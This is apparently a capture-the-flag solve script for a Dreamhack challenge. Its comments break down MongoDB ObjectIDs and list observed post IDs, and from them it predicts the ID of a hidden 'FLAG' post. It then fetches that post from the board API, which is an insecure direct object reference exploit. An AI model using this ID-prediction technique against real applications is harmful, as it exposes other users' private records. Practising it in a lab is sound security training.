# MongoDB ObjectID = timestamp(4-byte) + random_value(5-byte) + counter(3-byte)

# 6a51eb04 7c5efe8854 f26e2e -- Hello
# 6a51eb08 7c5efe8854 f26e2f -- Mongo
# 6a51eb09 7c5efe8854 f26e30 -- FLAG
# 6a51eb0a 7c5efe8854 f26e31 -- GOOD

import requests

URL = "http://host3.dreamhack.games:10243"

flag_id = "6a51eb097c5efe8854f26e30"

res = requests.get(URL+'/api/board/'+flag_id)
print(res.json().get('body'))